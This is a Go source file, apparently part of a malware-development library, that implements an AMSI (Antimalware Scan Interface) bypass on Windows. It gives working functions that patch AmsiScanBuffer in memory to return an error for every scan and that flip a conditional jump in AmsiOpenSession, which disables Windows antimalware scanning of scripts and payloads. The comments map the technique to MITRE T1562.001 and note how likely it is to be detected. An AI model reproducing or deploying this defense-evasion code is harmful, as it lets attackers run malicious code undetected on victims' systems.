//go:build windows

// Package amsi provides AMSI (Antimalware Scan Interface) bypass techniques.
//
// Technique: Runtime memory patching of amsi.dll functions.
// MITRE ATT&CK: T1562.001 (Impair Defenses: Disable or Modify Tools)
// Detection: Medium — EDR may monitor VirtualProtect on amsi.dll pages.
//
// Two methods:
//   - PatchScanBuffer: overwrites AmsiScanBuffer to return AMSI_RESULT_CLEAN
//   - PatchOpenSession: flips a conditional jump in AmsiOpenSession
package amsi

import (
	"fmt"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
)

// PatchScanBuffer patches AmsiScanBuffer to always return AMSI_RESULT_CLEAN.
// The patch overwrites the function entry with: mov eax, 0x80070057; ret
// This makes AMSI report E_INVALIDARG for all scans, effectively disabling it.
//
// Returns nil if amsi.dll is not loaded (nothing to patch).
func PatchScanBuffer() error {
	proc := api.Amsi.NewProc("AmsiScanBuffer")
	if err := proc.Find(); err != nil {
		return nil // AMSI not loaded
	}
	// mov eax, 0x80070057; ret
	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	return api.PatchMemory(proc.Addr(), patch)
}

// PatchOpenSession patches AmsiOpenSession to prevent AMSI initialization.
// Scans the first 1024 bytes of the function for a JZ (0x74) conditional jump
// and flips it to JNZ (0x75), causing the session open to always fail.
//
// Returns nil if amsi.dll is not loaded.
func PatchOpenSession() error {
	proc := api.Amsi.NewProc("AmsiOpenSession")
	if err := proc.Find(); err != nil {
		return nil // AMSI not loaded
	}
	addr := proc.Addr()
	for i := uintptr(0); i < 1024; i++ {
		b := *(*byte)(unsafe.Pointer(addr + i))
		if b == 0x74 { // JZ
			return api.PatchMemory(addr+i, []byte{0x75}) // JNZ
		}
	}
	return fmt.Errorf("AmsiOpenSession: conditional jump (0x74) not found in first 1024 bytes")
}

// PatchAll applies both PatchScanBuffer and PatchOpenSession.
// Returns the first error encountered, or nil if both succeed.
func PatchAll() error {
	if err := PatchScanBuffer(); err != nil {
		return fmt.Errorf("AmsiScanBuffer: %w", err)
	}
	if err := PatchOpenSession(); err != nil {
		return fmt.Errorf("AmsiOpenSession: %w", err)
	}
	return nil
}
